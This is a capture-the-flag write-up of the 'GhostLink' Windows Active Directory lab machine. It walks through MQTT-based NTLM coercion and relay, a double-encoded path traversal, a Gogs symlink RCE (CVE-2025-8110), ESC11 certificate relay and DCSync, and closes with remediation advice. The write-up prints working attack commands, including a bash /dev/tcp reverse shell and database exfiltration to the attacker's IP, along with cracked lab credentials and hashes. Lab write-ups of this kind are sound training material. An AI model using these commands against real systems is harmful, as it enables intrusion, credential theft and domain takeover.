|Property|Value|
|---|---|
|**OS**|Windows|
|**Difficulty**|Hard|
|**Release Date**|2026-06-23|
|**State**|Retired (Staff Pick)|
|**IP**|10.129.188.129|
|**Techniques**|MQTT enumeration, forced NTLM authentication, NTLM relay (LDAP/HTTP/RPC), browser session hijacking, double URL-encoded path traversal (LFI), KeePass database cracking, Gogs symlink RCE (CVE-2025-8110), AD CS ESC11 abuse, multi-protocol coercion, DCSync|
|**Tags**|#ad #windows #privesc #mqtt #ntlmrelay #adcs #iis|

> **Note:** The machine's IP address changes across sections of this writeup due to restarts (`10.129.188.129`, `10.129.189.74`, `10.129.190.87`, `10.129.191.32`). The internal `172.16.20.0/24` segment hosts the two Gogs/file-share vhosts (`gpz-op26-toolkits`, `gpz-op26-secure`) used later in the chain.

---

## Summary

GhostLink is a hard Windows Active Directory machine built around an exposed MQTT broker. Anonymous access to the broker discloses several internal hostnames and IPs, and publishing a crafted health-check message coerces an internal service account, `svc_canary`, into making an outbound authenticated request to an attacker-controlled listener. The captured NetNTLMv2 hash doesn't crack, but the same forced-authentication trick is reused to relay `svc_canary`'s live NTLM session straight into an internal file-sharing portal, bypassing its login entirely with a patched version of the `ghostsurf` relay/session-hijacking tool. A path traversal flaw in that portal's download endpoint is then abused to pull `svc_canary`'s registry hive and recent-document shortcuts, which eventually leads to a KeePass database holding credentials for a Gogs account, `vroth`. Gogs 0.13.3 is vulnerable to CVE-2025-8110, a symlink-based RCE that grants a shell as the `git` service account; its SQLite database yields password hashes for several accounts, one of which cracks for `nvirelli`, who also has a matching local Linux account and holds the user flag. Privilege escalation abuses an ESC11-vulnerable certificate authority: coercing the domain controller's machine account and relaying its authentication over unsigned RPC (ICPR) into the CA mints a certificate for `DC01$`, which is then used to DCSync the domain Administrator's hash and complete the box.

---

## Enumeration

### Nmap Scan

```
sudo nmap -sC -sV 10.129.188.129 --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 06:13 EDT
Nmap scan report for 10.129.188.129
Host is up (0.051s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Ghost Protocol Zero
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb0.)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m01s
```

```
echo '10.129.188.129 ghostlink.htb dc01.ghostlink.htb dc01' | sudo tee -a /etc/hosts
```

A full TCP sweep adds one more port of interest beyond the standard AD set:

```
sudo nmap -p- 10.129.188.129 --open
...
1883/tcp  open  mqtt
...
```

```
sudo nmap -sCV -p 1883 10.129.188.129 --open
PORT     STATE SERVICE VERSION
1883/tcp open  mqtt
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/brokers/client_status/mqttui-...: {"status":"online","username":"(null)",...}
```

`username: (null)` already hints the broker accepts unauthenticated clients. `DC01` / `ghostlink.htb` confirms a standard AD domain controller, plus IIS 10 on port 80 hosting a themed "Ghost Protocol Zero" corporate page.

---

## MQTT Enumeration

```
apt-get install mosquitto mosquitto-clients
```

```
mosquitto_sub -h ghostlink.htb -t "#" -v
```

Subscribing to the wildcard topic `#` with no credentials dumps every message flowing through the broker, anonymous access is allowed:

```
GhostProtocolZero/energy/grid/frequency {"timestamp":"...","node":"node-2","telemetry":{"ip":"10.2.45.56","loadPercent":40,"hz":74252576.9}}
GhostProtocolZero/identity/trust-provider/state {"node":"node-1","telemetry":{"ip":"10.1.12.34","tokenValidation":"delayed","authErrors":2}}
GhostProtocolZero/network/node/healthcheck {"node":"node-3","telemetry":{"healthy":true,"url":"https://transport.ghostlink.htb/keepalive","ip":"10.4.23.11"}}
GhostProtocolZero/network/node/keepalive {"node":"node-1","telemetry":{"status":"error","url":"https://core-telecom.ghostlink.htb/keepalive","ip":"10.1.12.34"}}
GhostProtocolZero/systems/node/domain/healthcheck {"node":"node-4","telemetry":{"healthy":true,"url":"dc01.ghostlink.htb/healthcheck","ip":"10.129.189.74"}}
GhostProtocolZero/systems/node/repository/healthcheck {"node":"node-5","telemetry":{"healthy":true,"url":"gpz-op26-toolkits.ghostlink.htb/healthcheck","ip":"172.16.20.20"}}
GhostProtocolZero/systems/node/secureshare/healthcheck {"node":"node-6","telemetry":{"healthy":true,"url":"gpz-op26-secure.ghostlink.htb/healthcheck","ip":"172.16.20.10"}}
```

This single subscription leaks the internal network layout:

|Hostname|IP|Source topic|
|---|---|---|
|`dc01.ghostlink.htb`|10.129.189.74|`systems/node/domain/healthcheck`|
|`gpz-op26-toolkits.ghostlink.htb`|172.16.20.20|`systems/node/repository/healthcheck`|
|`gpz-op26-secure.ghostlink.htb`|172.16.20.10|`systems/node/secureshare/healthcheck`|
|`transport.ghostlink.htb`|—|`network/node/healthcheck`|
|`core-telecom.ghostlink.htb`|—|`network/node/keepalive`|

Several health-check payloads include a `"url"` field, and the backend actually fetches/requests that URL to verify the service is reachable. That server-side fetch is the critical piece enabling the foothold

Publishing is unauthenticated too (a quick throwaway test confirms it):

```
mosquitto_pub -h ghostlink.htb -t 'test/injection' -r -m 'pentest'
mosquitto_sub -h ghostlink.htb -t 'test/injection' -v -W 2
test/injection pentest
```

---

## Foothold

### Forced NTLM Authentication via MQTT Health-Check Spoofing

If the `"url"` field in a health-check message is really fetched by an internal process, publishing a forged message with that field pointing at an attacker-controlled host should force that process to make an outbound HTTP request, the same idea as a PetitPotam/coercion attack, just delivered over MQTT instead of RPC.

The first attempt tries to relay that forced authentication straight into LDAP:

```
mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","ip":"10.129.189.74"}}'
```

```
impacket-ntlmrelayx -t ldap://10.129.189.74 --http-port 8888 -smb2support
[*] (HTTP): Connection from 10.129.189.74 controlled, attacking target ldap://10.129.189.74
[-] (HTTP): Authenticating against ldap://10.129.189.74 as GHOSTLINK/SVC_CANARY FAILED
```

The relay fails every time (LDAP signing/channel binding most likely), but it does confirm the identity behind the callback: `svc_canary`.

Switching to Responder to simply capture the hash instead of relaying it, and re-pointing the spoofed URL at the secure-share host (`172.16.20.10`):

```
sudo responder -I tun0
mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"telemetry":{"healthy":true,"url":"http://10.10.14.148/healthcheck","ip":"172.16.20.10"}}'
```

```
[HTTP] NTLMv2 Client   : 10.129.189.74
[HTTP] NTLMv2 Username : ghostlink\svc_canary
[HTTP] NTLMv2 Hash     : svc_canary::ghostlink:afdbf9989345f00d:319C8080BFC4AB1CD3948BEF95E05C9C:...
```

```
hashcat -m 5600 svc_canary.hash /usr/share/wordlists/rockyou.txt
...
Status...........: Exhausted
Recovered........: 0/1
```

The hash doesn't crack against rockyou. Rather than brute-forcing further, the same callback primitive can be reused to relay `svc_canary`'s live session instead of just capturing it.

### Discovering Gogs (gpz-op26-toolkits)

```
curl -s http://gpz-op26-toolkits.ghostlink.htb/user/login | grep -i -E "gogs|version"
<link rel="stylesheet" href="/css/gogs.min.css?v=5084b4a9b77a506f5e287e82e945e1c6882b827a">
```

The asset query string leaks the exact commit the server is running. Looking it up on GitHub shows it's the "update version to 0.13.3" commit:

![](./screens/gogs4.png)


Gogs 0.13.3 is vulnerable to **CVE-2025-8110**, an authenticated RCE, but no valid Gogs credentials are known yet, so this is noted for later.

![](./screens/gogs1.png)


![](./screens/gogs2.png)

![](./screens/gogs3.png)

### Bypassing the Login on gpz-op26-secure via NTLM Relay

`gpz-op26-secure.ghostlink.htb` presents a login prompt:

![](./screens/1.png)


Since `svc_canary` can be forced to authenticate anywhere on demand (via the MQTT callback), its session can simply be _relayed_ into this site's login instead of being cracked. A relay confirms it works:

```
mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m '{"telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","ip":"172.16.20.10"}}'

python3 ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 --keep-relaying
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
```

`ntlmrelayx` only keeps a relayed connection alive for a single request/response, though. Not enough to actually browse the app. **ghostsurf** ([senderend/ghostsurf](https://github.com/senderend/ghostsurf)) solves that: it relays NTLM auth and exposes the hijacked, authenticated session through a persistent SOCKS proxy, so the attacker can browse the site as the victim in real time.

```
python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --kernel-auth --http-port 8888
[-] (HTTP): Exception while Negotiating NTLM: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
```

The vendored relay config is missing an attribute the server expects. Patching `lib/relay/utils/config.py` to initialize it fixes the crash:

![](./screens/2.png)

```python
# lib/relay/utils/config.py
self.remove_target = False
```

Re-running, relay negotiation now succeeds and a live SOCKS session for `svc_canary` appears:

```
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy

ghostsurf> socks
Protocol  Target                         Username              Port
--------  -----------------------------  --------------------  ----
HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  80
```

Pointing Burp/browser at the SOCKS proxy (`127.0.0.1:1080`) now loads the site fully authenticated as `svc_canary`:

![](./screens/burp.png)

![](./screens/3.png)

---

## Path Traversal LFI on gpz-op26-secure

The portal lets a visitor upload a file and returns a download link:

![](./screens/4.png)

A first upload attempt through the relay hit a problem as the relay's own HTTP body-handling mangled POST payloads containing `=` characters (base64), breaking the upload:

![](./screens/5.png)

The bug is in ghostsurf's vendored SOCKS HTTP plugin, which splits the request on a fixed `\r\n\r\n` delimiter instead of actually locating the header/body boundary. Patching `lib/relay/servers/socksplugins/http.py`:

```python
# before
response.append(b'')
body_parts = data.split(EOL+EOL)
if len(body_parts) > 1:
    response.append(body_parts[1])
else:
    response.append(b'')
senddata = EOL.join(response)

# after
response.append(b'')
headerEnd = data.find(EOL+EOL)
if headerEnd != -1:
    body = data[headerEnd+4:]
else:
    body = b''
response.append(body)
senddata = EOL.join(response)
```

Uploads now succeed and return a working download link:

![](./screens/6.png)

Testing the `/api/download/<token>` endpoint with a normal token returns the uploaded, encrypted file as expected:

![](./screens/7.png)

Trying a **double URL-encoded** traversal sequence (`%252e%252e%255c` → decodes once to `%2e%2e%5c` → decodes again to `..\`) instead of a token reads arbitrary files off disk:

```
GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569 HTTP/1.1
```

Confirmed by reading `C:\Windows\win.ini`:

![](./screens/8.png)

### Enumerating svc_canary's Files

Still authenticated as `svc_canary` through the relay, the same traversal reads that user's own `NTUSER.DAT` registry hive:

```
GET /api/download/..\..\..\..\..\..\..\users\svc_canary\ntuser.dat HTTP/1.1
```

![](./screens/9.png)

```
proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat' -O ntuser.dat
```

Parsing it offline with RegRipper's `recentdocs` plugin shows a recently opened archive:

```
regripper -r ntuser.dat -p recentdocs
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
MRUListEx = 0
  0 = db.zip
```

`RecentDocs` doesn't give a full path, but Windows also stores a `.lnk` shortcut for every recent file under `AppData\Roaming\Microsoft\Windows\Recent`. Pulling that shortcut through the same LFI and inspecting it with `file` discloses the real location:

```
proxychains wget '.../AppData%255cRoaming%255cMicrosoft%255cWindows%255cRecent%255cdb.zip.lnk' -O db.zip.lnk

file db.zip.lnk
db.zip.lnk: MS Windows shortcut, ... LocalBasePath "C:\Users\svc_canary\Documents\Operations\Management\db.zip"
```

Downloading the real file and unpacking it:

```
proxychains wget '.../Documents%255cOperations%255cManagement%255cdb.zip.' -O db.zip
unzip db.zip
  inflating: db.kdbx
  inflating: .key.keyx
```

`db.kdbx` is a KeePass database, and `.key.keyx` is its key file. With both available (no master password needed), it opens directly and discloses credentials for a Gogs account, `vroth`:

![](./screens/10.png)

```
vroth:mOo03jpsqx8JQYMBwvFP
```

---

## Gogs RCE as vroth — CVE-2025-8110

Logging in to `gpz-op26-toolkits.ghostlink.htb` as `vroth` shows an existing account with some repositories:

![](./screens/11.png)

CVE-2025-8110 abuses Gogs' Content API together with a symlink staged via a normal `git push`: a symlink pointing at `.git/config` is committed and pushed through the native git protocol (which doesn't enforce Gogs' usual path restrictions), and the API's file-write endpoint is then used to write _through_ that symlink, overwriting the real `.git/config` with attacker-controlled content, including a malicious `core.sshCommand`. The next time Gogs performs a git operation on that repository over its own internal SSH transport, the injected command executes server-side as the `git` service account.

A new repository is created for the exploit and a personal access token is generated:

![](./screens/12.png)

![](./screens/13.png)

```shell
git clone http://gpz-op26-toolkits.ghostlink.htb/vroth/rce.git
cd rce && git init
ln -s .git/config link
git add link
git commit -m "add"
git push
```

Confirming the symlink via the API:

```
curl -s "http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link" \
  -H "Authorization: token c60a5d95cb04329a47df0a64275720cbf83c7216"
{"type":"symlink","target":".git/config", ...}
```

A malicious config with a reverse-shell `sshCommand`, base64-encoded and written through the symlink:

```ini
[core]
        sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.14.148/4444 0>&1'
[remote "origin"]
        url = git@gpz-op26-toolkits.ghostlink.htb:vroth/rce.git
```

```shell
curl -X PUT "http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link" \
  -H "Content-Type: application/json" \
  -H "Authorization: token c60a5d95cb04329a47df0a64275720cbf83c7216" \
  -d '{"message":"update","sha":"74a16c50bb417b927af27e37af24480f00ed5232",
       "committer":{"name":"test","email":"test@test.com"},
       "content":"<base64 config>"}'
```

The next internal git operation Gogs performs on the repo triggers the config, firing the reverse shell:

```
nc -lvnp 4444
bash: cannot set terminal process group (690): Inappropriate ioctl for device
bash: no job control in this shell
git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ id
uid=1000(git) gid=1000(git) groups=1000(git)
```

---

## Lateral Movement from git to nvirelli

No common tooling (`python3`, `curl`, `wget`) is available on this host, so Gogs' SQLite database is exfiltrated over a raw TCP socket using bash's `/dev/tcp`:

```
git@gpz-op26-toolkits:~/data$ cat /opt/gogs/data/gogs.db > /dev/tcp/10.10.14.148/9001
```

```
nc -lvnp 9001 > gogs.db
```

Dumping the user table:

```sql
sqlite3 gogs.db
SELECT id, name, email, passwd, salt, is_admin FROM user;
```

```
id  name             email                    is_admin
1   vroth            vroth@ghostlink.htb      0
2   nvirelli         nvirelli@ghostlink.htb   1
3   gpz-tools-admin  null@ghostlink.htb       1
4   zkovacs          zkovacs@ghostlink.htb    0
5   ohexley          ohexley@ghostlink.htb    0
```

Gogs salts and hashes passwords with PBKDF2-HMAC-SHA256. Converting `nvirelli`'s hash/salt into hashcat's format with [GogsToHashcat](https://github.com/shinris3n/GogsToHashcat) and cracking it:

```
python3 GogsToHashcat.py -n 10000 -o nvirelli.hash <salt> <hash>
hashcat -m 10900 nvirelli.hash /usr/share/wordlists/rockyou.txt
...
nvirelli:u47YUclrDiwWxBheaSzI
```

`nvirelli` is also an admin account, and credential reuse between the domain and this host grants access on the Linux host :

```
su nvirelli
Password: u47YUclrDiwWxBheaSzI
```

---

## User Flag

```
nvirelli@gpz-op26-toolkits:~$ cat user.txt
3757972b50096951cd82879c0bf788f8
```

---

## Privilege Escalation

### Enumeration

```
nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --users
...
SMB  ... [*] Enumerated 11 local users: GHOSTLINK
```

No immediately exploitable shares or BloodHound edges turn up with `nvirelli`'s rights. Deeper access requires reaching the internal `172.16.20.0/24` segment where the certificate authority lives, so a chisel SOCKS tunnel is built from the already-compromised toolkits host:

>Kali:

```
./chisel server -v -p 1234 --reverse --socks5
```


>gpz-op26-toolkits

```
./chisel client -v 10.10.14.148:1234 R:socks
```

### Finding ESC11 with certipy

```
proxychains certipy-ad find -u nvirelli@ghostlink.htb -p u47YUclrDiwWxBheaSzI \
  -dc-ip 10.129.191.32 -dc-host dc01.ghostlink.htb -vulnerable -stdout
```

```
Certificate Authorities
  CA Name    : ghostlink-GPZ-OP26-SECURE-CA
  DNS Name   : gpz-op26-secure.ghostlink.htb
  Web Enrollment  HTTP: Enabled
  Enforce Encryption for Requests : Disabled
  [!] Vulnerabilities
    ESC8  : Web Enrollment is enabled over HTTP.
    ESC11 : Encryption is not enforced for ICPR (RPC) requests.
```

**ESC11** is the RPC cousin of ESC8: a certificate authority can be configured to require signing/sealing on ICPR (certificate enrollment) RPC calls via the `IF_ENFORCEENCRYPTICPR` flag. When that's disabled, an NTLM authentication captured over RPC can be relayed straight into the CA — exactly like ESC8 relays an HTTP login — letting an attacker request a certificate _as whoever authenticates_, including a domain controller's own machine account.

### Exploiting ESC11

A relay listener is set up in ICPR mode against the CA, requesting a `DomainController` certificate:

```
sudo proxychains ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR \
  -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -smb2support --template DomainController
```

`coercer` is used to force `DC01`'s machine account to authenticate back to the relay, trying several classic coercion primitives (MS-RPRN, MS-EVEN, MS-DFSNM, etc.):

```
coercer coerce -l 10.10.14.148 -t dc01.ghostlink.htb -d ghostlink.htb \
  -u nvirelli -p u47YUclrDiwWxBheaSzI --always-continue
```

One of the vectors lands, and the relay catches `DC01$`'s authentication, requesting and receiving a certificate for it:

```
[*] (RPC): Authenticating connection from GHOSTLINK/DC01$@10.129.191.32 against rpc://172.16.20.10 SUCCEED [1]
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Successfully requested certificate
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
```

### Certificate → NT Hash → DCSync

```
certipy-ad auth -pfx DC01.pfx -dc-ip 10.129.191.32
[*] Using principal: 'dc01$@ghostlink.htb'
[*] Got hash for 'dc01$@ghostlink.htb': aad3b435b51404eeaad3b435b51404ee:b134be0fd94663725991c87bdff7c42c
```

A domain controller's machine account legitimately holds replication rights, so this hash is enough to DCSync the domain Administrator:

```
secretsdump.py 'ghostlink.htb/dc01$@dc01.ghostlink.htb' -dc-ip 10.129.191.32 \
  -hashes :b134be0fd94663725991c87bdff7c42c -just-dc-user administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002ddd63eb209b016696:::
```

---

## Root Flag

```
evil-winrm -i ghostlink.htb -u administrator -H 8190e067f478002ddd63eb209b016696
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ebe6de5acd30469507826e1c1f8a3563
```

---

## Remediation

- **Anonymous MQTT access:** Require authentication on the broker, apply per-topic ACLs, and never publish internal hostnames/IPs or raw telemetry that reveals network topology on a topic anyone can subscribe to.
- **Health-check callbacks as a forced-authentication primitive:** A backend process that fetches a URL supplied in an untrusted (MQTT) message is both an SSRF and a coercion vector. Validate and allow-list any URL/host consumed this way, and never perform that fetch under a privileged service account's credentials.
- **Missing NTLM relay mitigations (HTTP & LDAP):** Enforce Extended Protection for Authentication (channel binding) on IIS sites using Windows authentication, require LDAP signing/channel binding, and disable NTLM in favor of Kerberos wherever feasible.
- **Double URL-encoded path traversal in `/api/download`:** Fully decode the input before validating, then canonicalize and confirm the resolved path stays inside the intended directory. Prefer opaque, server-generated tokens over client-influenced file paths entirely.
- **Sensitive credential store reachable via LFI:** A KeePass database and its key file were stored together, unencrypted at rest beyond the database itself, inside a regular user profile reachable from a web-facing LFI. Keep key files off the same host/share as the database they unlock, and restrict where credential stores can be written.
- **CVE-2025-8110 (Gogs symlink RCE):** Upgrade Gogs past 0.13.3. Validate that content-API writes never resolve through a symlink outside the intended repository path.
- **Crackable application password hashes:** `nvirelli`'s Gogs password was recoverable from rockyou. Enforce a strong password policy, and never reuse an application-level password for a local OS account.
- **ESC8 / ESC11 on AD CS:** Disable HTTP web enrollment or require HTTPS with channel binding (ESC8), and enable `IF_ENFORCEENCRYPTICPR` so RPC-based certificate requests require signing/sealing (ESC11), closing off NTLM relay to the CA entirely.
- **Multi-protocol coercion against the DC:** Patch/mitigate known forced-authentication vectors (PetitPotam, PrinterBug, DFSCoerce, etc.), enable SMB signing domain-wide, and monitor for unexpected inbound RPC/SMB connection attempts to non-DC hosts.
- **DC machine account certificates enabling DCSync:** Monitor Certificate Services logs for `DomainController`-template issuance requested by anything other than the legitimate DC's own enrollment process.

---

## References

- [MQTT / Mosquitto Pentesting — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html)
- [ghostsurf — NTLM relay browser session hijacking (SpecterOps)](https://github.com/senderend/ghostsurf)
- [specterops.io — ghostsurf: From NTLM Relay to Browser Session Hijacking](https://specterops.io/blog/2026/04/02/ghostsurf-from-ntlm-relay-to-browser-session-hijacking/)
- [CVE-2025-8110 — Gogs Symlink RCE](https://github.com/gogs/gogs)
- [RegRipper](https://github.com/keydet89/RegRipper3.0)
- [Certipy — AD CS abuse toolkit](https://github.com/ly4k/Certipy)
- [coercer — Multi-protocol forced authentication tool](https://github.com/p0dalirius/Coercer)
- [Microsoft / SpecterOps — ESC8 & ESC11 AD CS abuse primitives](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Impacket](https://github.com/fortra/impacket)
- [chisel](https://github.com/jpillora/chisel)